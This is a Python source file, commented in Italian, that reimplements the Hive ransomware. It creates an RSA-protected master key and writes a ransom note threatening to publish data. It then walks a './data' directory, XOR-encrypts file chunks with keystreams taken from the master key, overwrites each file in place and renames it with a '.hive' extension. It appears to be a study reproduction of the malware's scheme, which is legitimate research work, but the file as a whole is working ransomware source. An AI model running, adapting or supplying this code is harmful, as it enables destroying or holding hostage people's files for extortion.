import os
import gc
import Crypto
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto import Random
import hashlib
from base64 import urlsafe_b64encode, urlsafe_b64decode

password = "hiveransomware"
division_size = 210

def base64UrlEncode(data):
    return urlsafe_b64encode(data).rstrip(b'=')

def base64UrlDecode(base64Url):
    padding = b'=' * (4 - (len(base64Url) % 4))
    return urlsafe_b64decode(base64Url + padding)

def create_masterkey():
    file_size = 10 * 1024 * 1024
    message = os.urandom(file_size)
    random_generator = Random.new().read
    key = RSA.generate(2048, random_generator)
    cipher = PKCS1_OAEP.new(key.publickey())
    
    message = [message[i:i+division_size] for i in range(0, len(message), division_size)]
    ciphertext = bytearray()
    for c in message:
        ciphertext.extend(cipher.encrypt(c)) #non so come vengono incollati questi chunk nella ricerca?
    with open("privatekey.pem", "wb") as f:
        f.write(key.export_key('PEM',passphrase=password))
        f.close()
    # Dimensione 10 MiB
    #int_key = int.from_bytes(os.urandom(file_size), byteorder='big') 
    #print(type(ciphertext))
    #ciphertext = cipher.encrypt(str(int_key))

    #print(hashlib.md5(ciphertext).digest())
    #print(bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())))

    mkey_name = bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())).decode(errors='backslashreplace') + '.key.hive' #baseurl64(MD5(encrypted_masterkey)).key.hive

    with open(mkey_name, 'wb') as f:
        f.write(ciphertext)
    gc.collect()
    return mkey_name

def open_masterkey(key_name):
    with open("privatekey.pem",'rb') as f:
        key = RSA.import_key(f.read(),passphrase=password)
        f.close()
    
    decipher = PKCS1_OAEP.new(key)

    with open(key_name,'rb') as ff:
        file_contents = ff.read()
        ff.close()
    message = [file_contents[i:i+256] for i in range(0, len(file_contents), 256)]
    ret_mess = bytearray()
    for c in message:
        ret_mess.extend(decipher.decrypt(c))
    return ret_mess
        #return decipher.decrypt(ff.read())
    

def create_ransomnote():
    note = "Il tuo sistema e' stato compromesso. Paga il riscatto o i tuoi dati saranno pubblicati sul nostro sito."
    with open('nota_di_riscatto.txt','w') as f:
        f.write(note)
    gc.collect()

def take_keystream(mkey,offset,size):
    return mkey[offset:offset+size]

def NBS_size_calc(FS):
    T = 0
    NBS = 0
    if(FS <= 0x1000): # < 4KiB
        T = 0
    elif(FS > 0x1000 and FS <= 0x20000): # < 128KiB
        T =  FS>>12
    elif(FS > 0x20000 and FS <= 0x100000): # < 1MiB
        T = ((FS>>12)*30)/100
    elif(FS > 0x100000 and FS <= 0xA00000): # < 10MiB
        T = ((FS>>12)*20)/100
    elif(FS > 0xA00000 and FS <= 0x6400000): # < 100MiB
        T = ((FS>>12)*10)/100
    elif(FS > 0x6400000 and FS <= 0x40000000): # < 1GiB
        T = ((FS>>12)*5)/100
    else: # > 1GiB
        T = ((FS>>12)*1)/100
    #----------------- calcoliamo NBS
    if (T == 1):
        NBS = 0
    else:
        NBS = (FS-(int(T)<<12))/(T-1)
    print("NBS = ", NBS)
    gc.collect()
    return int(NBS)       

def create_EKS(ks1,ks2):
    EKS = bytearray(0xFFFFF)
    for i in range(0,0xFFFFF):
        EKS[i] = ks1[i] ^ ks2[i%0x400]
    gc.collect()
    return EKS

def full_encrypting(file, ks1, ks2):
    file_stats = os.stat(file)
    encrypted_file = bytearray(file_stats.st_size)
    #• EKS[i]← Keystream1[i] ^ Keystream2[i%0x400]
    EKS = create_EKS(ks1,ks2)

    with open(file,'rb') as f:
        fileinbytes = bytearray(f.read())
        
    for i in range(0,file_stats.st_size):
        encrypted_file[i] = fileinbytes[i] ^ EKS[i%0x100000]
    gc.collect()
    return encrypted_file

def chunk_encrypting(file, ks1, ks2, NBS):
    file_stats = os.stat(file)
    encrypted_file = [] 
    EKS = create_EKS(ks1,ks2)
    with open(file,'rb') as f:
        fileinbytes = bytearray(f.read())

    target_size = int(file_stats.st_size)
    my_size = 0
    chunks = []
    flag_enc = True
    current = 0
    
    while my_size < target_size:
        gc.collect()
        if (flag_enc):
            #print([True, current, current+0x1000])
            chunks.append([True, fileinbytes[int(current):int(current+0x1000)], int(current), int(current+0x1000)])
            my_size += int(0x1000)
            current += int(0x1000)
            flag_enc = not flag_enc
        else:
            chunks.append([False, fileinbytes[int(current):int(current+NBS)]])
            my_size += int(NBS)
            current += int(NBS)
            flag_enc = not flag_enc

    print(len(chunks))

    if(len(chunks[-1][1]) > int(0x1000)):
        print("Last chunk > 0x1000")
        addition = chunks[-1][1][:0x1000]
        remainder = chunks[-1][1][0x1000:]
        chunks[-1][1] = remainder
        chunks[-2][1] = addition
    
    for c in chunks:
        gc.collect()
        if c[0] == True:
            arr = []
            for i in range(c[2],c[3]):
                try:
                    arr.append(fileinbytes[i]^EKS[i%0x100000])
                except:
                    print("out of index ", len(fileinbytes), i)               
            encrypted_file.extend(arr)
        else:
            encrypted_file.extend(list(c[1]))
    gc.collect()
    return encrypted_file


def list_files(dir):
    # Create an empty list to store the paths of all files in all subdirectories
    file_paths = []

    # Walk through all subdirectories and append the path of every file to file_paths
    for root, directories, files in os.walk(dir):
        for filename in files:
            # Join the root path and the filename to create the full file path
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)
    gc.collect()
    return file_paths

def hive_ransomware():
    #Fase 1: creazione della master key
    key_name = create_masterkey()
    #Fase 2: creazione del messaggio di riscatto
    create_ransomnote()
    root = "./data"
    for file in list_files(root):
        print("file_name = ", os.path.join(root, file))
        print("file_size = ", os.stat(file).st_size)

        R1 = int.from_bytes(os.urandom(8),"little")
        R2 = int.from_bytes(os.urandom(8),"little")
        keystream1 = bytearray(take_keystream(open_masterkey(key_name), R1 % 0x900000, 1024*1024)) #Prendiamo un numero casuale di 8 byte, facciamo un'operazione di modulo con il valore 0x900000 e prendiamo da questo offset nella nostra masterkey una porzione di 1MiB.
        keystream2 = bytearray(take_keystream(open_masterkey(key_name), R2 % 0x9FFC00, 1024)) #stessa cosa di prima ma l'offset è diverso e prendiamo 1KiB

        encrypted_file = chunk_encrypting(file, keystream1, keystream2, NBS_size_calc(os.stat(file).st_size))
        with open(file,'wb') as f:
            f.write(bytearray(encrypted_file))

        file_path = os.path.join("", file)

        #(base64url(MD5(Encrypted_master_key)||R1||R2)) dove || è una concatenazione semplice

        gc.collect()

        digest_bin = bytes(hashlib.md5(open_masterkey(key_name)).hexdigest(), encoding="utf-8")

        new_name = file + "." + str(base64UrlEncode(digest_bin).decode('utf-8'))
        gc.collect()
        new_name = new_name + str(base64UrlEncode(bytes(hex(R1)[2:],encoding="utf-8")).decode('utf-8'))
        gc.collect()
        new_name = new_name + str(base64UrlEncode(bytes(hex(R2)[2:],encoding="utf-8")).decode('utf-8')) +".hive"
        new_path = os.path.join("", new_name)
        print(new_path)
        os.rename(file_path, new_path)
    #cleanup(key_name)

def cleanup(key_name):

    entries = os.scandir("./")

    files = [entry for entry in entries if entry.is_file() and entry.name == key_name]

    for file in files:
        os.remove(file.path)
    gc.collect()

if __name__ == '__main__':
    hive_ransomware()
